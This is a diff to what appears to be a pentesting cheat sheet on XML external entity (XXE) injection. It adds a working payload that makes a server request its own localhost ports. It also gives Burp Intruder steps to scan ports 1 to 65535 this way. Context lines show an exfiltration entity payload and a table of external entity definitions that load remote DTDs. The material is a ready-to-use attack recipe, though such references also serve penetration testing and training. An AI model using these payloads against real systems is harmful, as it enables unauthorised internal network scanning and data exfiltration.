@@ -33,6 +33,28 @@
     <file>&exfil;</file>
       </upload>
 
+### Server-Side Request Forgey with XXE Injection Internal Port Scanning payload:
+
+      <!DOCTYPE foo [
+        <!ELEMENT foo ANY >
+        <!ENTITY xxe SYSTEM "http://localhost:§10§/" >
+      ]>
+      <contact>
+        <name>&xxe;</name>
+        <email>test@test.com</email>
+        <message>test</message>
+      </contact>
+
+ - 1) Send this payload to Burp Intruder
+
+ - 2) Select the port number in the localhost URI
+  
+ - 3) Go to payloads -> Select payload type: Numbers
+  
+ - 4) Payload Settings -> From 1 to 65535
+  
+ - 5) Start Attack
+
 | **Code**   | **Description**   |
 | --------------|-------------------|
 | `<!ENTITY xxe SYSTEM "http://localhost/email.dtd">` | Define External Entity to a URL |
